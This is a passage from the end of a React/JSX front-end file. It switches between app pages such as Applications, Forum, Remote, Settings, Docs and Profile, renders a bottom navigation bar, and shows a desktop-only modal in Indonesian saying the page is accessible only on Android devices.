                                currentPage === 'settings' ? <Settings setShowNavigation={setShowNavigation} /> :
                                    currentPage === 'docs' ? <Docs /> :
                                        <Profile />}
                </div>
            ) : (
                <div>
                    {currentPage === 'home' ? <Applications /> :
                        currentPage === 'forum' ? <Forum /> :
                            currentPage === 'remote' ? <Remote /> :
                                currentPage === 'settings' ? <Settings setShowNavigation={setShowNavigation} /> :
                                    currentPage === 'docs' ? <Docs /> :
                                        <Profile />}
                </div>
            )}

            {showNavigation && (
                <div className="fixed bottom-0 left-0 right-0 p-4 bg-[#161616] rounded-lg">
                    <Navigation onNavigate={onNavigate} />
                </div>
            )}

            {isModalOpen && isDesktop && (
                <div className="fixed top-0 left-0 w-full h-full bg-black bg-opacity-50 flex justify-center items-center">
                    <div className="bg-[#2C2F33] rounded-lg p-4 w-96">
                        <h2 className="text-lg font-bold text-white">Perhatian</h2>
                        <p class ="text-gray-400">Halaman ini hanya dapat diakses melalui perangkat android.</p>
                        <div className="flex justify-end mt-4">
                            <button className="bg-[#7289DA] text-white py-2 px-4 rounded-lg" onClick={closeModal}>
                                OK
                            </button>
                        </div>
                    </div>
                </div>
            )}
        </div>
        );
};

ReactDOM.render(<App />, document.getElementById('root'));